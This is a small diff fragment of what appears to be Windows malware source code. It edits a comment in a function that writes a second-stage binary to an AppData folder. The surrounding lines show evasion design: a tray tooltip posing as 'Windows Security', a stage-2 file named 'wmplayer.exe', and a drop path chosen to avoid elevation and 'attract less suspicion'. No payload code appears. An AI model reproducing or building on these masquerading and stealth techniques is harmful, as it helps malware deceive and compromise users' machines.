@@ -63,7 +63,7 @@ static const wchar_t* TRAY_TIP     = L"Windows Security";  // blends in
 static const wchar_t* STAGE2_NAME  = L"wmplayer.exe";
 
 // ---------------------------------------------------------------------------
-// GetStage2Path — writes to AppData\Microsoft\Windows\WinStore\
+// GetStage2Path — writes to AppData\Microsoft\Windows\WinStore
 //
 // This directory already exists on modern Windows and is writable
 // without elevation. Binaries here attract less suspicion than Desktop.
